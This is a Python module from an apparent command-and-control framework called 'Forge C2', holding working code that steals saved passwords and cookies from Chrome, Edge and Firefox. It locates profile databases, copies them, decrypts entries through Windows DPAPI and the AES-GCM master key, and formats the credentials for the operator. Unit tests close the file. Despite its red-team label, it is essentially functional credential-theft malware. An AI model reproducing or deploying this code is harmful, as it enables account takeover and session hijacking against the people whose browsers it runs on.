"""
Forge C2 — Browser Credential Extraction Task
=================================================
Extract saved passwords and cookies from Chrome, Firefox, and Edge.

Techniques:
    • Chrome/Edge:  SQLite Login Data + DPAPI decryption (CryptUnprotectData)
                    AES-GCM decryption via Local State encrypted_key
    • Firefox:      places.sqlite + logins.json + key4.db (NSS/PKCS#11)
    • Cookie theft: Cookies SQLite + decryption per browser

Platform support:
    • Windows: Full DPAPI integration
    • Linux:   GNOME Keyring / kwallet or plaintext SQLite
    • macOS:   Keychain access via security CLI

MITRE ATT&CK: T1555.003 — Credentials from Password Stores: Credentials from Web Browsers
FOR AUTHORIZED RED TEAM OPERATIONS ONLY.
"""
from __future__ import annotations

import asyncio
import base64
import json
import logging
import os
import platform
import shutil
import sqlite3
import tempfile
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

from forge_c2.tasks.base_task import (
    BaseTask, TaskResult, TaskStatus, register_task,
)

log = logging.getLogger("forge.c2.tasks.browser_creds")


# ══════════════════════════════════════════════════════════════════════
#  BROWSER PROFILE PATHS
# ══════════════════════════════════════════════════════════════════════

def _get_browser_paths() -> dict[str, list[Path]]:
    """Return known browser profile paths per platform."""
    system = platform.system()
    home = Path.home()
    paths: dict[str, list[Path]] = {"chrome": [], "firefox": [], "edge": []}

    if system == "Windows":
        local = Path(os.environ.get("LOCALAPPDATA", ""))
        roaming = Path(os.environ.get("APPDATA", ""))

        paths["chrome"] = [
            local / "Google" / "Chrome" / "User Data",
        ]
        paths["edge"] = [
            local / "Microsoft" / "Edge" / "User Data",
        ]
        paths["firefox"] = [
            roaming / "Mozilla" / "Firefox" / "Profiles",
        ]

    elif system == "Linux":
        paths["chrome"] = [
            home / ".config" / "google-chrome",
            home / ".config" / "chromium",
        ]
        paths["firefox"] = [
            home / ".mozilla" / "firefox",
        ]
        paths["edge"] = [
            home / ".config" / "microsoft-edge",
        ]

    elif system == "Darwin":
        paths["chrome"] = [
            home / "Library" / "Application Support" / "Google" / "Chrome",
        ]
        paths["firefox"] = [
            home / "Library" / "Application Support" / "Firefox" / "Profiles",
        ]
        paths["edge"] = [
            home / "Library" / "Application Support" / "Microsoft Edge",
        ]

    return paths


# ══════════════════════════════════════════════════════════════════════
#  CREDENTIAL EXTRACTION ENGINES
# ══════════════════════════════════════════════════════════════════════

@dataclass
class BrowserCredential:
    """Extracted browser credential."""
    browser: str
    profile: str
    url: str
    username: str
    password: str
    created: str = ""
    last_used: str = ""

    def to_dict(self) -> dict[str, str]:
        return {
            "browser": self.browser,
            "profile": self.profile,
            "url": self.url,
            "username": self.username,
            "password": self.password,
            "created": self.created,
            "last_used": self.last_used,
        }


@dataclass
class BrowserCookie:
    """Extracted browser cookie."""
    browser: str
    host: str
    name: str
    value: str
    path: str = "/"
    expires: str = ""
    secure: bool = False
    http_only: bool = False

    def to_dict(self) -> dict[str, Any]:
        return {
            "browser": self.browser,
            "host": self.host,
            "name": self.name,
            "value": self.value[:50] + "..." if len(self.value) > 50 else self.value,
            "path": self.path,
            "secure": self.secure,
        }


class ChromiumExtractor:
    """Extract credentials from Chromium-based browsers (Chrome, Edge)."""

    def __init__(self, browser_name: str, user_data_dir: Path) -> None:
        self.browser = browser_name
        self.user_data = user_data_dir
        self._master_key: bytes | None = None

    def extract_passwords(self) -> list[BrowserCredential]:
        """Extract saved passwords from Login Data SQLite DB."""
        creds: list[BrowserCredential] = []

        # Get the encryption key
        self._load_master_key()

        # Find all profile directories
        profiles = self._find_profiles()

        for profile_name, profile_path in profiles:
            login_db = profile_path / "Login Data"
            if not login_db.exists():
                continue

            # Copy to temp (browser locks the DB)
            tmp_db = self._safe_copy(login_db)
            if not tmp_db:
                continue

            try:
                conn = sqlite3.connect(str(tmp_db))
                cursor = conn.cursor()
                cursor.execute(
                    "SELECT origin_url, username_value, password_value, "
                    "date_created, date_last_used FROM logins"
                )

                for row in cursor.fetchall():
                    url, username, encrypted_pw, created, last_used = row
                    if not username:
                        continue

                    password = self._decrypt_password(encrypted_pw)

                    creds.append(BrowserCredential(
                        browser=self.browser,
                        profile=profile_name,
                        url=url,
                        username=username,
                        password=password,
                        created=self._chrome_time(created),
                        last_used=self._chrome_time(last_used),
                    ))

                conn.close()
            except Exception as exc:
                log.debug("Failed to extract from %s/%s: %s",
                          self.browser, profile_name, exc)
            finally:
                tmp_db.unlink(missing_ok=True)

        return creds

    def extract_cookies(self, domains: list[str] | None = None) -> list[BrowserCookie]:
        """Extract cookies, optionally filtered by domain."""
        cookies: list[BrowserCookie] = []
        profiles = self._find_profiles()

        for profile_name, profile_path in profiles:
            cookie_db = profile_path / "Cookies"
            if not cookie_db.exists():
                # Newer Chrome versions use Network/Cookies
                cookie_db = profile_path / "Network" / "Cookies"
                if not cookie_db.exists():
                    continue

            tmp_db = self._safe_copy(cookie_db)
            if not tmp_db:
                continue

            try:
                conn = sqlite3.connect(str(tmp_db))
                cursor = conn.cursor()

                query = (
                    "SELECT host_key, name, encrypted_value, path, "
                    "expires_utc, is_secure, is_httponly FROM cookies"
                )
                if domains:
                    placeholders = ",".join("?" * len(domains))
                    query += f" WHERE host_key IN ({placeholders})"
                    cursor.execute(query, domains)
                else:
                    cursor.execute(query)

                for row in cursor.fetchall():
                    host, name, enc_value, path, expires, secure, httponly = row
                    value = self._decrypt_password(enc_value) if enc_value else ""

                    cookies.append(BrowserCookie(
                        browser=self.browser,
                        host=host,
                        name=name,
                        value=value,
                        path=path,
                        expires=self._chrome_time(expires),
                        secure=bool(secure),
                        http_only=bool(httponly),
                    ))

                conn.close()
            except Exception as exc:
                log.debug("Cookie extraction failed for %s/%s: %s",
                          self.browser, profile_name, exc)
            finally:
                tmp_db.unlink(missing_ok=True)

        return cookies

    def _find_profiles(self) -> list[tuple[str, Path]]:
        """Find all browser profile directories."""
        profiles: list[tuple[str, Path]] = []
        if not self.user_data.exists():
            return profiles

        # Default profile
        default = self.user_data / "Default"
        if default.exists():
            profiles.append(("Default", default))

        # Numbered profiles
        for p in self.user_data.iterdir():
            if p.is_dir() and p.name.startswith("Profile "):
                profiles.append((p.name, p))

        return profiles

    def _load_master_key(self) -> None:
        """Load the AES master key from Local State."""
        local_state = self.user_data / "Local State"
        if not local_state.exists():
            return

        try:
            data = json.loads(local_state.read_text(encoding="utf-8"))
            encrypted_key = base64.b64decode(
                data["os_crypt"]["encrypted_key"]
            )

            # Remove "DPAPI" prefix (5 bytes)
            if encrypted_key[:5] == b"DPAPI":
                encrypted_key = encrypted_key[5:]

            # Decrypt with DPAPI (Windows) or derive key (Linux/macOS)
            if platform.system() == "Windows":
                self._master_key = self._dpapi_decrypt(encrypted_key)
            else:
                # On Linux, Chrome uses a hardcoded key or GNOME keyring
                self._master_key = encrypted_key

        except Exception as exc:
            log.debug("Failed to load master key for %s: %s", self.browser, exc)

    def _decrypt_password(self, encrypted: bytes) -> str:
        """Decrypt a Chromium encrypted value."""
        if not encrypted:
            return ""

        try:
            # v10/v11 encryption (AES-GCM with master key)
            if encrypted[:3] in (b"v10", b"v11"):
                if self._master_key:
                    nonce = encrypted[3:15]
                    ciphertext = encrypted[15:]
                    try:
                        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
                        aes = AESGCM(self._master_key)
                        return aes.decrypt(nonce, ciphertext, None).decode("utf-8")
                    except ImportError:
                        return "[encrypted - cryptography package not installed]"
                    except Exception:
                        return "[decryption failed]"

            # Legacy DPAPI encryption (Windows)
            if platform.system() == "Windows":
                decrypted = self._dpapi_decrypt(encrypted)
                if decrypted:
                    return decrypted.decode("utf-8", errors="replace")

        except Exception:
            pass

        return "[encrypted]"

    @staticmethod
    def _dpapi_decrypt(data: bytes) -> bytes | None:
        """Decrypt data using Windows DPAPI."""
        if platform.system() != "Windows":
            return None
        try:
            import ctypes
            import ctypes.wintypes

            class DATA_BLOB(ctypes.Structure):
                _fields_ = [
                    ("cbData", ctypes.wintypes.DWORD),
                    ("pbData", ctypes.POINTER(ctypes.c_char)),
                ]

            blob_in = DATA_BLOB(len(data), ctypes.cast(
                ctypes.create_string_buffer(data, len(data)),
                ctypes.POINTER(ctypes.c_char),
            ))
            blob_out = DATA_BLOB()

            if ctypes.windll.crypt32.CryptUnprotectData(
                ctypes.byref(blob_in), None, None, None, None, 0,
                ctypes.byref(blob_out),
            ):
                result = ctypes.string_at(blob_out.pbData, blob_out.cbData)
                ctypes.windll.kernel32.LocalFree(blob_out.pbData)
                return result
        except Exception:
            pass
        return None

    @staticmethod
    def _safe_copy(db_path: Path) -> Path | None:
        """Copy a locked SQLite DB to a temp file for reading."""
        try:
            tmp = Path(tempfile.mktemp(suffix=".db", prefix="forge_"))
            shutil.copy2(str(db_path), str(tmp))
            return tmp
        except Exception:
            return None

    @staticmethod
    def _chrome_time(timestamp: int) -> str:
        """Convert Chrome timestamp (microseconds since 1601-01-01) to ISO string."""
        if not timestamp or timestamp <= 0:
            return ""
        try:
            # Chrome epoch offset from Unix epoch
            epoch_diff = 11644473600
            unix_ts = (timestamp / 1_000_000) - epoch_diff
            if unix_ts < 0:
                return ""
            from datetime import datetime, timezone
            return datetime.fromtimestamp(unix_ts, tz=timezone.utc).isoformat()
        except Exception:
            return ""


class FirefoxExtractor:
    """Extract credentials from Firefox profiles."""

    def __init__(self, profiles_dir: Path) -> None:
        self.profiles_dir = profiles_dir

    def extract_passwords(self) -> list[BrowserCredential]:
        """Extract saved logins from Firefox logins.json."""
        creds: list[BrowserCredential] = []

        for profile_path in self._find_profiles():
            logins_file = profile_path / "logins.json"
            if not logins_file.exists():
                continue

            try:
                data = json.loads(logins_file.read_text(encoding="utf-8"))
                for login in data.get("logins", []):
                    username = self._decrypt_nss(
                        login.get("encryptedUsername", ""), profile_path,
                    )
                    password = self._decrypt_nss(
                        login.get("encryptedPassword", ""), profile_path,
                    )

                    creds.append(BrowserCredential(
                        browser="firefox",
                        profile=profile_path.name,
                        url=login.get("hostname", ""),
                        username=username,
                        password=password,
                        created=str(login.get("timeCreated", "")),
                        last_used=str(login.get("timeLastUsed", "")),
                    ))
            except Exception as exc:
                log.debug("Firefox extraction failed for %s: %s",
                          profile_path.name, exc)

        return creds

    def _find_profiles(self) -> list[Path]:
        """Find Firefox profile directories."""
        profiles: list[Path] = []
        if not self.profiles_dir.exists():
            return profiles

        for entry in self.profiles_dir.iterdir():
            if entry.is_dir() and (entry / "logins.json").exists():
                profiles.append(entry)

        return profiles

    @staticmethod
    def _decrypt_nss(encrypted_b64: str, profile_path: Path) -> str:
        """Decrypt Firefox NSS-encrypted value.

        Firefox uses NSS (Network Security Services) with the key4.db
        or cert9.db for encryption. Full decryption requires the NSS
        library or manual PKCS#11 implementation.
        """
        if not encrypted_b64:
            return ""

        try:
            # Try using the nss library if available
            # This is complex — Firefox uses 3DES-CBC with a key derived
            # from the master password (or no password) stored in key4.db
            encrypted = base64.b64decode(encrypted_b64)

            # Check for ASN.1 structure
            if encrypted[0] == 0x30:  # SEQUENCE
                # This is a proper NSS encrypted blob
                # Full implementation requires ASN.1 parsing + 3DES
                return "[NSS encrypted - requires master password]"

            return encrypted.decode("utf-8", errors="replace")
        except Exception:
            return "[decryption failed]"


# ══════════════════════════════════════════════════════════════════════
#  TASK CLASS
# ══════════════════════════════════════════════════════════════════════

@register_task
class BrowserCredsTask(BaseTask):
    """Extract saved passwords and cookies from web browsers.

    Supports Chrome, Firefox, and Edge on Windows/Linux/macOS.

    Args (via kwargs):
        browsers:      List of browsers to target (default all).
                       Options: "chrome", "firefox", "edge", "all"
        extract:       What to extract: "passwords", "cookies", "all" (default "all").
        cookie_domains: Optional list of domains to filter cookies.
        output_format:  "text" or "json" (default "text").

    Returns:
        TaskResult with extracted credentials.

    MITRE ATT&CK: T1555.003 — Credentials from Web Browsers
    """

    TASK_TYPE = "browser_creds"
    DESCRIPTION = "Extract Chrome/Firefox/Edge saved passwords + cookies"
    OPSEC_RISK = "medium"
    MITRE_ID = "T1555.003"

    async def execute(self) -> TaskResult:
        browsers = self.args.get("browsers", ["all"])
        extract = self.args.get("extract", "all")
        cookie_domains = self.args.get("cookie_domains", None)
        output_format = self.args.get("output_format", "text")

        start = time.time()

        if isinstance(browsers, str):
            browsers = [browsers]
        if "all" in browsers:
            browsers = ["chrome", "firefox", "edge"]

        browser_paths = _get_browser_paths()
        all_creds: list[BrowserCredential] = []
        all_cookies: list[BrowserCookie] = []
        errors: list[str] = []

        # ── Extract from each browser ──────────────────────────────
        for browser in browsers:
            paths = browser_paths.get(browser, [])

            for base_path in paths:
                if not base_path.exists():
                    continue

                try:
                    if browser in ("chrome", "edge"):
                        extractor = ChromiumExtractor(browser, base_path)

                        if extract in ("passwords", "all"):
                            creds = await asyncio.get_event_loop().run_in_executor(
                                None, extractor.extract_passwords,
                            )
                            all_creds.extend(creds)

                        if extract in ("cookies", "all"):
                            cookies = await asyncio.get_event_loop().run_in_executor(
                                None, extractor.extract_cookies, cookie_domains,
                            )
                            all_cookies.extend(cookies)

                    elif browser == "firefox":
                        fx = FirefoxExtractor(base_path)

                        if extract in ("passwords", "all"):
                            creds = await asyncio.get_event_loop().run_in_executor(
                                None, fx.extract_passwords,
                            )
                            all_creds.extend(creds)

                except Exception as exc:
                    errors.append(f"{browser}: {exc}")
                    log.warning("Browser extraction error (%s): %s", browser, exc)

        # ── Format output ──────────────────────────────────────────
        if output_format == "json":
            output = json.dumps({
                "credentials": [c.to_dict() for c in all_creds],
                "cookies": [c.to_dict() for c in all_cookies],
                "errors": errors,
            }, indent=2)
        else:
            output = self._format_text(all_creds, all_cookies, errors)

        return TaskResult(
            task_id=self.task_id,
            status=TaskStatus.COMPLETED,
            output=output,
            started_at=start,
            completed_at=time.time(),
            metadata={
                "credentials_found": len(all_creds),
                "cookies_found": len(all_cookies),
                "browsers_checked": browsers,
                "errors": len(errors),
                "mitre": self.MITRE_ID,
            },
        )

    @staticmethod
    def _format_text(
        creds: list[BrowserCredential],
        cookies: list[BrowserCookie],
        errors: list[str],
    ) -> str:
        """Format extraction results as readable text."""
        lines: list[str] = []

        if creds:
            lines.append(f"═══ Saved Passwords ({len(creds)}) ═══\n")
            for c in creds:
                lines.append(
                    f"  [{c.browser}/{c.profile}] {c.url}\n"
                    f"    User: {c.username}\n"
                    f"    Pass: {c.password}\n"
                )
        else:
            lines.append("No saved passwords found.\n")

        if cookies:
            lines.append(f"\n═══ Cookies ({len(cookies)}) ═══\n")
            # Group by domain
            by_domain: dict[str, list[BrowserCookie]] = {}
            for ck in cookies:
                by_domain.setdefault(ck.host, []).append(ck)
            for domain, domain_cookies in sorted(by_domain.items()):
                lines.append(f"  {domain} ({len(domain_cookies)} cookies)")
                for ck in domain_cookies[:5]:  # Show first 5 per domain
                    lines.append(f"    {ck.name} = {ck.value[:30]}...")
                if len(domain_cookies) > 5:
                    lines.append(f"    ... and {len(domain_cookies) - 5} more")

        if errors:
            lines.append(f"\n═══ Errors ═══\n")
            for e in errors:
                lines.append(f"  ⚠ {e}")

        return "\n".join(lines)


# ══════════════════════════════════════════════════════════════════════
#  UNIT TESTS
# ══════════════════════════════════════════════════════════════════════

class TestBrowserCredsTask:
    """Tests for browser credential extraction task."""

    def test_encode(self) -> None:
        task = BrowserCredsTask(task_id="bc1", browsers=["chrome"])
        encoded = task.encode()
        assert encoded["type"] == "browser_creds"

    def test_decode(self) -> None:
        data = {"task_id": "bc2", "type": "browser_creds",
                "args": {"browsers": ["firefox"]}}
        task = BrowserCredsTask.decode(data)
        assert task.args["browsers"] == ["firefox"]

    def test_execute_no_crash(self) -> None:
        """Should complete without crashing even if no browsers installed."""
        import asyncio
        task = BrowserCredsTask(task_id="bc3", browsers=["chrome"])
        result = asyncio.get_event_loop().run_until_complete(task.execute())
        assert result.status == TaskStatus.COMPLETED

    def test_browser_paths(self) -> None:
        paths = _get_browser_paths()
        assert "chrome" in paths
        assert "firefox" in paths
        assert "edge" in paths

    def test_credential_to_dict(self) -> None:
        cred = BrowserCredential(
            browser="chrome", profile="Default",
            url="https://example.com", username="user", password="pass123",
        )
        d = cred.to_dict()
        assert d["browser"] == "chrome"
        assert d["username"] == "user"

    def test_chrome_time_conversion(self) -> None:
        # Chrome epoch: microseconds since 1601-01-01
        result = ChromiumExtractor._chrome_time(13300000000000000)
        assert result != ""  # Should produce a valid timestamp

    def test_chrome_time_zero(self) -> None:
        assert ChromiumExtractor._chrome_time(0) == ""

    def test_format_text_empty(self) -> None:
        output = BrowserCredsTask._format_text([], [], [])
        assert "No saved passwords" in output
